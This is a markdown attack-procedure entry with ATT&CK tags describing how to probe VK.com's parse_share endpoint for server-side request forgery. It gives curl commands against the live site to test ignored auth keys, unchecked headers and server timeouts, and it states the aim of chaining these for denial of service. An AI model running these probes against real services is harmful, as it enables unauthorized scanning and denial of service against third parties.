---
tags:
  - ssrf
  - recon
  - vk.com
  - php
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Active Scanning]]'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques: []
id: 7c8171e8-9c00-48bf-b966-52253dfd9eb6
created_at: '2025-12-14T04:39:18.696Z'
updated_at: '2025-12-14T04:39:18.696Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Active Scanning]]'
---
# Identify-SSRF-Vulnerable-Endpoint-in-VK-Share-Service

## Summary

This procedure involves analyzing the VK.com upload.php / parse_share endpoint to identify SSRF vulnerabilities stemming from ignored authentication keys (hash and rhash) and lack of validation on Content-* headers for target URLs, enabling arbitrary server-side requests.

## Description

In the context of VK.com's share service, the endpoint processes GET requests for content sharing but bypasses proper authentication and header validation. This allows attackers to probe for SSRF by sending requests with external URLs, confirming the vulnerability through successful fetches without credentials. The procedure is a reconnaissance step to map the attack surface before exploitation, typically performed in a web environment using HTTP tools.

## Requirements

1. Access to VK.com public endpoints over HTTPS
2. HTTP client like curl or browser dev tools for request inspection
3. Basic understanding of HTTP headers and URL parameters

## Defense

Defensive measures and detection strategies:

- Implement strict URL whitelisting and blacklist external domains in share endpoints
- Enforce authentication checks on all identifying parameters like hash and rhash
- Monitor for anomalous server-side requests to internal or external resources

## Objectives

1. Confirm SSRF by verifying ignored auth keys and unvalidated headers
2. Document endpoint behavior for chaining with DoS exploitation
3. Identify timeout configurations that amplify resource consumption

## Instructions

### Step 1: Inspect Endpoint Parameters

**Context**: Send a basic GET request to the parse_share endpoint without auth keys to check if it processes arbitrary URLs.

Use curl to test:

```bash
curl -X GET "https://vk.com/upload.php?act=parse_share&url=http://example.com" -v
```

> This command sends a request with a benign external URL. Observe verbose output for ignored hash/rhash and successful processing.

### Step 2: Test Header Validation

**Context**: Attempt to manipulate Content-* headers to confirm lack of validation, simulating SSRF payload preparation.

Use curl with custom headers:

```bash
curl -X GET "https://vk.com/upload.php?act=parse_share&url=http://example.com" -H "Content-Type: application/json" -v
```

> Expected output shows the request proceeds despite invalid headers for the target URL, indicating vulnerability.

### Step 3: Verify Timeout Behavior

**Context**: Probe with a slow-responding URL to measure server-side timeout length.

Use curl with a delayed endpoint:

```bash
curl -X GET "https://vk.com/upload.php?act=parse_share&url=http://httpbin.org/delay/10" --max-time 30 -v
```

> Success if the server waits the full timeout (e.g., 30s+), confirming potential for DoS.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Active Scanning]] Active Scanning

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[ssrf]]
- [[recon]]
- [[web]]
